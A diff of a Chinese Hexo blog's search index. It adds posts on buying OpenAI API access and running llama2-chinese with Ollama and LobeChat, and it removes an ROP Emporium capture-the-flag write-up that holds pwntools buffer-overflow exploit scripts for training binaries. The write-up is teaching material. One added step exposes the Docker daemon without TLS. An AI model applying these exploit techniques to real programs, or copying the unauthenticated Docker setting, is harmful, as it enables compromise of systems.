@@ -1,8 +1,93 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>OpenAI APIKey申请教程</title>
+    <url>/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><code>GPT-4o</code>发布后，默认的账户可以限时使用了。在一次的问题提问过程中，发现确实要比<code>GPT-3.5</code>效果好不少，于是决定购买一些API的使用量。</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>需要一张可支付的卡。我使用了WildCard: <a href="https://wildcard.com.cn/">https://wildcard.com.cn</a> , 根据教程以及说明充值开通即可。需要注意的是，提前充值<code>10$</code>以上，以及开启OpenAI的自动续费。</p>
+<p>使用我的邀请码（<strong>可以减免2美金</strong>）：JKSGOPF7</p>
+<h2 id="API使用"><a href="#API使用" class="headerlink" title="API使用"></a>API使用</h2><p>使用中，发现<code>User APIkeys</code>可以完美，但是<code>Project APIkeys</code>提示不正确</p>
+<p>价格对比，相对性价比较高的模型</p>
+<table>
+<thead>
+<tr>
+<th>Model</th>
+<th>Input</th>
+<th>Output</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>gpt-3.5-turbo</td>
+<td>US$3.00 &#x2F; 1M tokens</td>
+<td>US$6.00 &#x2F; 1M tokens</td>
+</tr>
+<tr>
+<td>gpt-4o</td>
+<td>US$5.00 &#x2F; 1M tokens</td>
+<td>US$15.00 &#x2F; 1M tokens</td>
+</tr>
+<tr>
+<td>gpt-4-turbo</td>
+<td>US$10.00 &#x2F; 1M tokens</td>
+<td>US$30.00 &#x2F; 1M tokens</td>
+</tr>
+<tr>
+<td>gpt-4</td>
+<td>US$30.00 &#x2F; 1M tokens</td>
+<td>US$60.00 &#x2F; 1M tokens</td>
+</tr>
+</tbody></table>
+<p>记得关注使用情况</p>
+<p><a href="https://platform.openai.com/usage">https://platform.openai.com/usage</a></p>
+<p><img src="/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/2024-06-01-13-21-45-image.png"></p>
+<h3 id="命令行使用"><a href="#命令行使用" class="headerlink" title="命令行使用"></a>命令行使用</h3><p>使用<code>ShellGPT</code>开源项目</p>
+<ul>
+<li><a href="https://github.com/TheR1D/shell_gpt">GitHub - TheR1D&#x2F;shell_gpt: A command-line productivity tool powered by AI large language models like GPT-4, will help you accomplish your tasks faster and more efficiently.</a></li>
+</ul>
+<p>依旧强大，可以在<code>~/.config/shell_gpt/.sgptrc</code>修改模型以及使用的key</p>
+<p><img src="/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/2024-06-01-13-23-50-image.png"></p>
+]]></content>
+      <tags>
+        <tag>效率</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LobeChat本地运行llama2-chinese大模型</title>
+    <url>/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="Ollama"><a href="#Ollama" class="headerlink" title="Ollama"></a>Ollama</h2><p><a href="https://ollama.com/">https://ollama.com/</a></p>
+<p>此处下载安装，需要设置如下环境变量</p>
+<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715222211820.png" alt="image-20240715222211820"></p>
+<p>此处发现可用中文大模型较少，只有一个<code>llama2-chinese</code></p>
+<ul>
+<li>7b参数，对GPU要求低<code>8G</code>即可</li>
+</ul>
+<p>安装使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ollama pull llama2-chinese</span><br><span class="line">ollama run llama2-chinese</span><br></pre></td></tr></table></figure>
+
+<h2 id="LobeChat"><a href="#LobeChat" class="headerlink" title="LobeChat"></a>LobeChat</h2><p><a href="https://lobehub.com/zh">https://lobehub.com/zh</a></p>
+<p>可以用来本地部署的前端，当然也可以调用其他模型</p>
+<p>使用Docker进行部署</p>
+<ul>
+<li><a href="https://www.docker.com/">https://www.docker.com/</a></li>
+</ul>
+<p>对于Docker，修改了如下配置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Expose daemon on tcp://localhost:2375 without TLS</span><br><span class="line">Disk image location</span><br></pre></td></tr></table></figure>
+
+<p>一键Docker安装<code>LobeChat</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3210:3210 -e OLLAMA_PROXY_URL=http://host.docker.internal:11434/v1 lobehub/lobe-chat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之后可以 docker stop/start进行退出，启动</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715222941954.png" alt="image-20240715222941954"></p>
+<p>之后对话切换模型，即可使用</p>
+<p><img src="/2024/07/15/LobeChat%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8Cllama2-chinese%E5%A4%A7%E6%A8%A1%E5%9E%8B/image-20240715223031465.png" alt="image-20240715223031465"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好像确实没有在线的<code>ChatGPT4-o</code>好用</p>
+]]></content>
+      <tags>
+        <tag>LLM</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>R2S软路由搭建指南</title>
-    <url>/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
+    <url>/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
     <content><![CDATA[<p>在一般访问Google等网站的情况下，往往需要在每个终端安装代理软件，如<code>Clash</code>，<code>SSR</code>等。而软路由的方式让我们对其访问变得无感。百科上对软路由的定义如下，即使用软件的方案来进行路由：</p>
 <blockquote>
 <p>软路由是指利用台式机或服务器的供应商配合一定软件而形成的路由解决方案，主要靠对软件的设置，实现路由器路由器的功能，它的软件与硬件是独立分开的。软路由使用普通计算机，使用通用的操作系统，如Linux或windows，因此软路由的设置事实上是windows或linux的设置。根据使用的操作系统不同，可以分为基于windows平台和基于Linux&#x2F;bsd平台开发的软件路由器。</p>
@@ -11,29 +96,29 @@
 
 <h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>Nanopi R2S</p>
 <p>最低价可以买裸板，TF卡自己单买的，5v3a&#x2F;2a电源使用之前的旧设备。读卡器已有</p>
-<p><img src="/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-06-06-image.png"></p>
+<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-06-06-image.png"></p>
 <p>64GTF卡</p>
-<p><img src="/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-10-18-image.png"></p>
+<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-10-18-image.png"></p>
 <h2 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h2><p>使用<code>FriendlyWrt</code>系统，镜像下载：</p>
 <p><a href="https://drive.google.com/drive/folders/1W-2MLML9lkD2xAVjiwzEBNiUlPF5BgU9">01_SD card images - Google 云端硬盘</a></p>
 <ul>
 <li>rk3328-sd-friendlywrt-23.05-20231223.img.gz</li>
 </ul>
 <p><code>balenaEtcher</code>烧录至TF卡</p>
-<p><img src="/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-15-56-image.png"></p>
+<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-15-56-image.png"></p>
 <h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>网络结构比较简单，如下<br>光猫&lt;——–&gt;(WAN)R2S(LAN)&lt;——–&gt;(WAN)小米路由器</p>
 <p>等待开机后，访问<code>192.168.2.1</code>。使用<code>root/passowrd</code>即可进入FriendlyWrt的管理后台</p>
-<p><img src="/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-35-01-image.png"></p>
+<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-35-01-image.png"></p>
 <h2 id="OpenClash配置"><a href="#OpenClash配置" class="headerlink" title="OpenClash配置"></a>OpenClash配置</h2><p>如<code>OpenClash</code>描述，需要安装客户端与内核模块</p>
 <p>客户端安装</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">* luci</span><br><span class="line">* luci-base</span><br><span class="line">* iptables</span><br><span class="line">* dnsmasq-full</span><br><span class="line">* coreutils</span><br><span class="line">* coreutils-nohup</span><br><span class="line">* bash</span><br><span class="line">* curl</span><br><span class="line">* jsonfilter</span><br><span class="line">* ca-certificates</span><br><span class="line">* ipset</span><br><span class="line">* ip-full</span><br><span class="line">* iptables-mod-tproxy</span><br><span class="line">* kmod-tun(TUN模式)</span><br><span class="line">* luci-compat(Luci-19.07)</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传IPK文件至您路由器的 /tmp 目录下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#假设安装包名字为</span></span><br><span class="line">luci-app-openclash_0.33.7-beta_all.ipk</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行安装命令</span></span><br><span class="line">opkg install /tmp/luci-app-openclash_0.33.7-beta_all.ipk</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行卸载命令</span></span><br><span class="line"><span class="comment">#插件在卸载后会自动备份配置文件到 /tmp 目录下，除非路由器重启，在下次安装时将还原您的配置文件</span></span><br><span class="line">opkg remove luci-app-openclash</span><br><span class="line"></span><br><span class="line">安装完成后刷新LUCI页面，在菜单栏 -&gt; 服务 -&gt; OpenClash 进入插件页面</span><br></pre></td></tr></table></figure>
 
 <p>内核</p>
 <p>进入<code>OpenClash</code>插件页面时，总是下载失败。可以增加代理来完成安装</p>
-<p><img src="/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-40-11-image.png"></p>
+<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-40-11-image.png"></p>
 <p>启动</p>
 <p>最后，上传配置文件，并启动即可。最终效果如下</p>
-<p><img src="/2024/03/05/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-41-41-image.png"></p>
+<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-41-41-image.png"></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.friendlyelec.com/wiki/index.php/NanoPi_R2S/zh">https://wiki.friendlyelec.com/wiki/index.php/NanoPi_R2S/zh</a></p>
 <p><a href="https://wiki.mbalib.com/wiki/%E8%BD%AF%E8%B7%AF%E7%94%B1">软路由 - MBA智库百科</a></p>
 <p><a href="https://github.com/vernesong/OpenClash/releases">Releases · vernesong&#x2F;OpenClash · GitHub</a></p>
@@ -108,7 +193,7 @@
 <p><a href="https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L1789">https://elixir.bootlin.com/glibc/glibc-2.26.9000/source/malloc/malloc.c#L1789</a></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">a = get_free_list ();</span><br><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">          narenas_limit = mp_.arena_max;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)</span><br><span class="line">          &#123;        </span><br><span class="line">            <span class="type">int</span> n = __get_nprocs (); <span class="comment">// 获取cpu cores</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">              narenas_limit = NARENAS_FROM_NCORES (n); <span class="comment">// 计算arenas上限</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                 cores.  */</span></span><br><span class="line">              narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// NARENAS_FROM_NCORES(n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br></pre></td></tr></table></figure>
 
-<p>每个arena结构中有一个锁用于控制对该arena的访问。<mark>需要注意的是</mark>：<strong>对于<code>fastbins</code>的访问，是原子操作，不需要进行加锁、解锁。</strong>互斥锁的争用是多个arena被创建的原因，分配给不同arena的线程不需要互相等待，线程会自动切换到未使用的arena上，如果存在争用。</p>
+<p>每个arena结构中有一个锁用于控制对该arena的访问。<mark>需要注意的是</mark>：**对于<code>fastbins</code>的访问，是原子操作，不需要进行加锁、解锁。**互斥锁的争用是多个arena被创建的原因，分配给不同arena的线程不需要互相等待，线程会自动切换到未使用的arena上，如果存在争用。</p>
 <p>每个arena从一个或多个heap中获取内存空间。main arena使用程序的初始化heap(.bss段等初始化完后)。其余的arena通过mmap为堆分配内存，随着先前的堆的使用完，继续添加更多的heap。每个arena会跟踪一个特殊的<code>&quot;top&quot; chunk</code>，这是最大的可用chunk，并且指向最近分配的heap。</p>
 <p>从arena分配的内存，可以很方便的从初始heap中获取。</p>
 <p><img src="/2023/04/22/Reading-MallocInternals/0f54be49aa8e3dde0941ce33608e57196ba7d19d.png"></p>
@@ -134,7 +219,7 @@
 <ul>
 <li>Unsorted</li>
 </ul>
-<p>FIFO原则，存放在bins数组的index为1的位置，即<code>bins[1]</code>。<strong>unsorted bin可以看作small bins和large bins的一个cache，只有一个双向链表。</strong>当chunk最初被释放时，最初被放入unsorted bin中，而分配时，如果该bin中没有合适的chunk，会将其所有的chunk分别加入到所属的bin中，然后再再bin中分配合适的chunk。</p>
+<p>FIFO原则，存放在bins数组的index为1的位置，即<code>bins[1]</code>。**unsorted bin可以看作small bins和large bins的一个cache，只有一个双向链表。**当chunk最初被释放时，最初被放入unsorted bin中，而分配时，如果该bin中没有合适的chunk，会将其所有的chunk分别加入到所属的bin中，然后再再bin中分配合适的chunk。</p>
 <p><mark>注意</mark>：初始化时，会将top chunk初始化为unsorted bin，但top chunk并不属于任何一个bin。</p>
 <ul>
 <li>Small</li>
@@ -185,7 +270,7 @@
 </li>
 </ul>
 <blockquote>
-<p>  M_MMAP_THRESHOLD is the request size threshold for using mmap()<br>  to service a request. Requests of at least this size that cannot<br>  be allocated using already-existing space will be serviced via mmap.<br>  (If enough normal freed space already exists it is used instead.)</p>
+<p>M_MMAP_THRESHOLD is the request size threshold for using mmap()<br>to service a request. Requests of at least this size that cannot<br>be allocated using already-existing space will be serviced via mmap.<br>(If enough normal freed space already exists it is used instead.)</p>
 </blockquote>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  mallopt(int parameter_number, int parameter_value)</span></span><br><span class="line"><span class="comment">  Sets tunable parameters The format is to provide a</span></span><br><span class="line"><span class="comment">  (parameter-number, parameter-value) pair.  mallopt then sets the</span></span><br><span class="line"><span class="comment">  corresponding parameter to the argument value if it can (i.e., so</span></span><br><span class="line"><span class="comment">  long as the value is meaningful), and returns 1 if successful else</span></span><br><span class="line"><span class="comment">  0.  SVID/XPG/ANSI defines four standard param numbers for mallopt,</span></span><br><span class="line"><span class="comment">  normally defined in malloc.h.  Only one of these (M_MXFAST) is used</span></span><br><span class="line"><span class="comment">  in this malloc. The others (M_NLBLKS, M_GRAIN, M_KEEP) don&#x27;t apply,</span></span><br><span class="line"><span class="comment">  so setting them has no effect. But this malloc also supports four</span></span><br><span class="line"><span class="comment">  other options in mallopt. See below for details.  Briefly, supported</span></span><br><span class="line"><span class="comment">  parameters are as follows (listed defaults are for &quot;typical&quot;</span></span><br><span class="line"><span class="comment">  configurations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Symbol            param #   default    allowed param values</span></span><br><span class="line"><span class="comment">  M_MXFAST          1         64         0-80  (0 disables fastbins)</span></span><br><span class="line"><span class="comment">  M_TRIM_THRESHOLD -1         128*1024   any   (-1U disables trimming)</span></span><br><span class="line"><span class="comment">  M_TOP_PAD        -2         0          any</span></span><br><span class="line"><span class="comment">  M_MMAP_THRESHOLD -3         128*1024   any   (or 0 if no MMAP support)</span></span><br><span class="line"><span class="comment">  M_MMAP_MAX       -4         65536      any   (0 disables use of mmap)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
 
@@ -281,7 +366,7 @@
 </li>
 <li><p>比特币网络新增两个杀手锏，一个是闪电网络，一个是 RSK。</p>
 </li>
-<li><p>《麻省理工科技评论》2018 年“全球十大突破性技术” ：<a href="http://mp.weixin.qq.com/s/_kdbSRdIwr4bIXfNtut8Fw%EF%BC%8C%E5%8C%BF%E5%90%8D%E8%B4%A7%E5%B8%81Zcash%E5%9C%A8%E5%8D%81%E5%A4%A7%E4%B9%8B%E4%B8%80%E9%87%8C%E8%A2%AB%E6%8F%90%E5%8F%8A%E3%80%82">http://mp.weixin.qq.com/s/_kdbSRdIwr4bIXfNtut8Fw，匿名货币Zcash在十大之一里被提及。</a></p>
+<li><p>《麻省理工科技评论》2018 年“全球十大突破性技术” ：<a href="http://mp.weixin.qq.com/s//_kdbSRdIwr4bIXfNtut8Fw%EF%BC%8C%E5%8C%BF%E5%90%8D%E8%B4%A7%E5%B8%81Zcash%E5%9C%A8%E5%8D%81%E5%A4%A7%E4%B9%8B%E4%B8%80%E9%87%8C%E8%A2%AB%E6%8F%90%E5%8F%8A%E3%80%82">http://mp.weixin.qq.com/s/\_kdbSRdIwr4bIXfNtut8Fw，匿名货币Zcash在十大之一里被提及。</a></p>
 </li>
 <li><p>看到 bettercap 从 Ruby 改为 Go，就等着 MSF 和 BeEF 了。黑客工程化的世界，要么 Python 要么 Go，其他都是小众，JavaScript 还差些火候。</p>
 </li>
@@ -716,135 +801,6 @@
 ]]></content>
       <tags>
         <tag>转载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ROP Emporium: Writeup</title>
-    <url>/2022/12/22/ROP-Emporium-Writeup/</url>
-    <content><![CDATA[<p>以蒸米的<a href="https://segmentfault.com/a/1190000007406442">一步一步学ROP之linux_x64篇</a>level5为例，进一步学习<code>ROP</code>技术</p>
-<h2 id="0x01-ret2win"><a href="#0x01-ret2win" class="headerlink" title="0x01 ret2win"></a>0x01 ret2win</h2><p>checksec</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec ./ret2win</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/w3b5h3ll/Desktop/thirdpart_projects/rop_emporium_all_challenges/ret2win/ret2win&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<p>bof</p>
-<p><code>s[32]</code>被溢出</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>poc</p>
-<p>使用32位演示，64位未知原因未能打印</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2win32&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret2win_addr = <span class="number">0x804862c</span></span><br><span class="line"><span class="comment"># 可使用msf-pattern_create msf-pattern_offset来确定padding</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(ret2win_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvall()</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"><span class="comment"># io.recvall()</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-split"><a href="#0x02-split" class="headerlink" title="0x02 split"></a>0x02 split</h2><p>相关位置</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80485e9:       6a 60                   push   0x60</span><br><span class="line">80485eb:       8d 45 d8                lea    eax,[ebp-0x28]</span><br><span class="line">80485ee:       50                      push   eax</span><br><span class="line">80485ef:       6a 00                   push   0x0</span><br><span class="line">80485f1:       e8 ba fd ff ff          call   80483b0 &lt;<span class="built_in">read</span>@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可用函数</p>
-<p>usefulFunction(): 0x804860c</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:0804861A                 call    _system</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/22/ROP-Emporium-Writeup/2024-05-29-15-03-43-image.png"></p>
-<p>solution:</p>
-<ul>
-<li>寻找可用的字符串，并传递给<code>system</code>进行调用</li>
-</ul>
-<p><img src="/2022/12/22/ROP-Emporium-Writeup/2024-05-29-15-05-52-image.png"></p>
-<p>poc</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./split32&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># p: locat process, r: remote process</span></span><br><span class="line">p = process(<span class="string">&quot;./split32&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols.system</span><br><span class="line">info(<span class="string">&quot;system_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">bincat_addr = <span class="number">0x8A4A030</span></span><br><span class="line">bincat_addr = elf.symbols.usefulString</span><br><span class="line">info(<span class="string">&quot;bincat_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bincat_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack layout</span></span><br><span class="line"><span class="comment"># caller</span></span><br><span class="line"><span class="comment"># arg2</span></span><br><span class="line"><span class="comment"># arg1</span></span><br><span class="line"><span class="comment"># ----</span></span><br><span class="line"><span class="comment"># return address</span></span><br><span class="line"><span class="comment"># ----</span></span><br><span class="line"><span class="comment"># callee&#x27;s stack frame</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(<span class="number">0x00</span>) + p32(bincat_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/22/ROP-Emporium-Writeup/2024-05-29-16-47-30-image.png"></p>
-<h2 id="0x03-callme"><a href="#0x03-callme" class="headerlink" title="0x03 callme"></a>0x03 callme</h2><p><code>usefulFunction()</code>依次调用3个函数并退出</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>打开<code>encrypted_flag.dat</code>文件需要正确处理参数值</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">callme_three</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEF</span> &amp;&amp; a2 == <span class="number">-889275714</span> &amp;&amp; a3 == <span class="number">-804392947</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;key2.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key2.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>poc</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./callme32&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># p: locat process, r: remote process</span></span><br><span class="line">p = process(<span class="string">&quot;./callme32&quot;</span>)</span><br><span class="line"></span><br><span class="line">callme_one = elf.symbols.callme_one</span><br><span class="line">callme_two = elf.symbols.callme_two</span><br><span class="line">callme_three = elf.symbols.callme_three</span><br><span class="line"></span><br><span class="line">a1 = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">a2 = p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">a3 = p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">args = a1 + a2 + a3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 每次执行完，恢复stack</span></span><br><span class="line">pop_ret = p32(<span class="number">0x080487f9</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(callme_one) + pop_ret + args</span><br><span class="line">payload += p32(callme_two) + pop_ret + args</span><br><span class="line">payload += p32(callme_three) + pop_ret + args</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure>
